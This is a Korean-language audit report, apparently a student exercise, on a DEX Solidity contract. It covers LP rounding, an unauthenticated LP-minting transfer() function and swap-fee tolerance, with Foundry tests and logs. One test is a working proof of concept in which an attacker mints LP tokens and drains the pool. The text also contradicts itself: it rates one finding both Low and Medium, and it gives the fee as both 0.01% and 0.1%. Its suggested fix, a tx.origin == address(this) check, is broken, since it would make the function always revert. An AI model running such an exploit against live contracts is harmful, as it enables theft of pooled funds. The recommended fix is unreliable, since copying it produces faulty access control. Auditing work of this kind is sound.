## 구민재

## 1. Initial liquidity under 1000 wei gets rounded

### 설명

문제 코드: Dex.sol line8, 31

```jsx
uint public constant MINIMUM_LIQUIDITY = 10**3;
...
function addLiquidity ... {
	...
  if (_totalSupply == 0) {
    LPTokenAmount = _sqrt((tokenXAmount + reserveX) * (tokenYAmount + reserveY) / MINIMUM_LIQUIDITY);
	...
        }
```

MINIMUM_LIQUIDITY라는 고정값 변수를 사용해 초기 LP토큰 발행량을 결정했다.

첫 LP토큰 발행시 1000 미만의 값은 버려지게 된다.

### 파급력

Low

-   산정 이유
    -   DEX 서비스 자체의 효용성이 떨어지는 버그이기 때문에 Low를 부여했다.
-   공격 시나리오

    -   첫 유동성 공급자가 공급한 두 토큰의 곱이 1000000으로 나누어떨어지지 않는 경우 무조건 문제가 발생한다. 이 경우 LP토큰 발행량의 1000 wei 아래의 값은 모두 버려진다.
    -   다만 이러한 문제가 발생했을 경우 DEX 유동성 공급자들이 유동성을 회수할 때 공급한 양보다 약간 더 적은 양을 받게 된다.
    -   DEX 서비스 자체에 문제가 생기기 때문에 Medium를 부여했다.
        ```jsx
        function testAddLiquidity1() external {
          uint firstLPReturn = dex.addLiquidity(500 ether, 1 ether, 0);
          emit log_named_uint("firstLPReturn", firstLPReturn);

          uint secondLPReturn = dex.addLiquidity(1 ether, 0.002 ether, 0);
          emit log_named_uint("secondLPReturn", secondLPReturn);

          (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
          emit log_named_uint("second LP remove", tx);
          emit log_named_uint("second LP remove", ty);

          assertEq(tx, 1 ether);
          assertEq(ty, 0.002 ether);
        }

        ```
        ```jsx
        [FAIL. Reason: Assertion failed.] testAddLiquidity1() (gas: 258781)
        Logs:
          firstLPReturn: 707106781186547524
          secondLPReturn: 1414213562373095
          second LP remove: 999999999999999966
          second LP remove: 1999999999999999
          Error: a == b not satisfied [uint]
                Left: 999999999999999966
               Right: 1000000000000000000
          Error: a == b not satisfied [uint]
                Left: 1999999999999999
               Right: 2000000000000000
        ```

-   난이도

    -   외부 공격자보다는 첫 유동성을 공급하는 DEX service provider로 인해 발생할 가능성이 높다.

-   발생할 수 있는 피해
    -   유동성 공급자들이 제 공급량을 찾아가지 못하므로 DEX의 사용성이 매우 떨어진다.

### 해결 방안

-   문제가 되는 코드에서 MINIMUM_LIQUIDITY 변수를 삭제하면 해결 가능하다.

## 2. No authority check for LP mint

### 설명

문제 코드: Dex.sol line106

transfer() 함수가 LP토큰을 mint해주는 중요한 역할을 하는 함수임에도 불구하고 권한 체크를 해주지 않았다. 따라서 누구나 접근 가능하며, 원하는 만큼의 LP토큰을 발행하고 그만큼 유동성 풀에 공급된 토큰을 탈취할 수 있다.

### 파급력

Critical

-   산정 이유
    -   누구든 접근할 수 있으며, 피해 규모 또한 크기 때문에 Critical을 부여했다.
-   공격 시나리오

    -   tester1이 유동성 공급을 전혀 하지 않은 상태에서 transfer() 함수를 통해 LP토큰을 자신에게 민팅하였고, 그 토큰을 이용해 유동성 풀에 공급된 전체 토큰을 탈취하였다.

    ```jsx
    function testTransfer() external {
      uint firstLPReturn = dex.addLiquidity(10000 ether, 10000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);

      address tester1 = vm.addr(1);
      uint tester1_balanceX_before = tokenX.balanceOf(tester1);
      uint tester1_balanceY_before = tokenY.balanceOf(tester1);
      emit log_named_uint("tester1's token X balance", tester1_balanceX_before);
      emit log_named_uint("tester1's token Y balance", tester1_balanceY_before);
      vm.startPrank(tester1);
          // vm.expectRevert("you are not authorized for LP mint.");
          dex.transfer(tester1, 10000 ether);
          dex.removeLiquidity(10000 ether, 1 ether, 1 ether);
          uint tester1_balanceX = tokenX.balanceOf(tester1);
          uint tester1_balanceY = tokenY.balanceOf(tester1);
          emit log_named_uint("tester1's token X balance", tester1_balanceX);
          emit log_named_uint("tester1's token Y balance", tester1_balanceY);
      vm.stopPrank();
    }
    ```

    ```jsx
    [PASS] testTransfer() (gas: 285355)
    Logs:
      firstLPReturn: 10000000000000000000
      tester1's token X balance: 0
      tester1's token Y balance: 0
      tester1's token X balance: 9990009990009990009990
      tester1's token Y balance: 9990009990009990009990
    ```

-   공격 난이도
    -   누구나 접근 가능하므로, 매우 쉽다.
-   발생할 수 있는 피해
    -   유동성 공급 여부와 상관없이 누구나 유동성 토큰을 발행할 수 있으며, 발행한 토큰의 양만큼 회수가 가능하다. 따라서 DEX에 공급된 자산 전부를 탈취할 수 있다.

### 해결 방안

-   transfer 함수의 접근 권한을 address(this)로 제한하면 해결된다.
    ```jsx
    function transfer(address to, uint256 lpAmount) public override(ERC20, IDex) returns (bool) {
      require(tx.origin == address(this), "you are not authorized");
      _mint(to, lpAmount);
      return true;
    }
    ```

## 3. Swap over tolerance

### 설명

문제 코드: Dex.sol swap 함수

swap의 규모가 커질 경우 0.01%의 tolerance를 벗어난 거래가 발생한다.

### 파급력

Informational

-   산정 이유
    -   외부 공격이 아닌 컨트랙트 자체의 문제점이다.
    -   swap의 규모가 매우 클 때만 발생한다.
    -   swap 최대치인 60000 ether일 경우에도 0.05%의 fee를 발생시켰다.
-   공격 시나리오
    ```jsx
    function testSwap1() external {
      dex.addLiquidity(3000 ether, 4000 ether, 0);
      dex.addLiquidity(30000 ether * 2, 40000 ether * 2, 0);

      // x -> y
      uint output = dex.swap(60000 ether, 0, 0);

      uint poolAmountX = 60000 ether + 3000 ether;
      uint poolAmountY = 80000 ether + 4000 ether;

      int expectedOutput = -(int(poolAmountX * poolAmountY) / int(poolAmountX + 60000 ether)) + int(poolAmountY);
      expectedOutput = expectedOutput * 999 / 1000; // 0.1% fee
      uint uExpectedOutput = uint(expectedOutput);

      emit log_named_int("expected output", expectedOutput);
      emit log_named_uint("real output", output);

      bool success = output <= (uExpectedOutput * 10001 / 10000) && output >= (uExpectedOutput * 9999 / 10000); // allow 0.01%;
      assertTrue(success, "Swap test fail 1; expected != return");
    }
    ```
    ```jsx
    [FAIL. Reason: Assertion failed.] testSwap1() (gas: 245828)
    Logs:
      expected output: 40934634146341463414634
      real output: 40954612005856515373352
      Error: Swap test fail 1; expected != return
      Error: Assertion Failed
    ```
    -   매우 큰 양의 토큰을 스왑시키면 0.01%를 넘어가는 수수료가 발생한다.
-   공격 난이도
    -   공격자를 요하지 않는 내부 로직 문제이다.

### 해결 방법

-   기존 컨트랙트는 스왑할 토큰의 양에서 0.01%를 제한 만큼을 스왑시킨 결과값을 사용하고 있다.
-   스왑할 토큰의 양을 그대로 두고 나온 값에서 0.01%를 제한 로직으로 바꾸면 해결된다.
